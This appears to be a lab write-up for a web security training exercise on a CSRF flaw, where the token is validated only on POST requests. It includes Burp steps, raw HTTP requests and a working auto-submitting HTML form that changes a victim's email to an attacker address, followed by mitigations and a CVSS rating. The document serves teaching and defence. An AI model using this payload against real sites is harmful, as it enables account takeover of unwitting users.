# Title: CSRF Where Token Validation Depends on Request Method

# Description

The email change functionality has a CSRF token in the form — but the server only validates that token when the request is sent as a POST. If the same request is sent as a GET instead, the server processes it without checking the token at all.

This is a partial and flawed CSRF defense. The developer added token validation, but forgot that the same endpoint also accepts GET requests. An attacker can simply craft a GET-based form (or just a URL) that submits the email change without including any CSRF token, and the server will accept it.

# Steps to Exploit

1. Log in using `wiener:peter` and navigate to "My Account".
2. Submit the email change form and intercept the POST request in Burp Suite.
3. Send the request to Burp **Repeater**.
4. Modify the value of the `csrf` parameter to anything invalid and send — observe the server rejects it with an error, confirming token validation is in place for POST.
5. Right-click the request in Repeater and select **"Change request method"** to convert it to a GET request.
6. Send the GET request — observe that the email change succeeds even without a valid CSRF token. The server is not validating the token on GET requests.
7. Go to the **Exploit Server** and paste the following HTML into the Body:
   ```html
   <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
       <input type="hidden" name="email" value="attacker@evil.com">
   </form>
   <script>
       document.forms[0].submit();
   </script>
   ```
   Note: The form has **no `method="POST"`** attribute — it defaults to GET, which bypasses the token check.
8. Click **Store**, then **View exploit** to confirm your own email changes.
9. Update the email value, then click **Deliver exploit to victim** — lab solved.

# Proof of Concept

**POST request (token validated — changing csrf value causes rejection):**
```
POST /my-account/change-email HTTP/2
Cookie: session=<victim_session>
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=INVALID_TOKEN
→ Response: 400 Bad Request (Invalid CSRF token)
```

**GET request (token not validated — bypass works):**
```
GET /my-account/change-email?email=attacker@evil.com HTTP/2
Cookie: session=<victim_session>

→ Response: 302 Found (Email changed successfully)
```

**CSRF exploit page (hosted on exploit server):**
```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

The HTML form has no `method` attribute, so it defaults to GET. The browser submits the email as a query parameter, the server receives a GET request, skips the CSRF token check entirely, and changes the victim's email.

# Impact

• The CSRF token defense is completely ineffective since the same operation is available via GET without validation.
• An attacker can change any victim's email address just by tricking them into visiting a crafted page or even clicking a link — GET requests can be triggered by image tags, link prefetching, or redirects.
• GET-based CSRF is actually worse than POST-based because the attack URL can be embedded in `<img src="">`, emails, or any link — no form interaction needed.
• Email change leads to account takeover via password reset to the attacker-controlled email.

# Mitigation / Remediation

1. Enforce CSRF token validation on **all** request methods — GET, POST, PUT, DELETE — not just POST.
2. For any state-changing operation, use POST exclusively and reject GET requests to that endpoint entirely.
3. Apply `SameSite=Strict` or `SameSite=Lax` on session cookies to prevent cross-origin requests from carrying credentials.
4. Use framework-level CSRF protection that applies uniformly across all HTTP methods rather than manually implementing checks per method.

# CVSS Score

CVSS v3.1 Score: 8.8 (High)
Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

**CVSS Justification**

Attack Vector: Network (Exploit is delivered via a link or page hosted remotely)
Attack Complexity: Low (Just removing the method attribute bypasses the entire defense)
Privileges Required: None (No account on the vulnerable site needed)
User Interaction: Required (Victim must visit the attacker's page or click a crafted link)
Scope: Unchanged (Impact is contained to the victim's account)
Confidentiality Impact: High (Email change enables password reset → full account takeover)
Integrity Impact: High (Account details modified without the victim's consent)
Availability Impact: High (Victim can be locked out of their account)
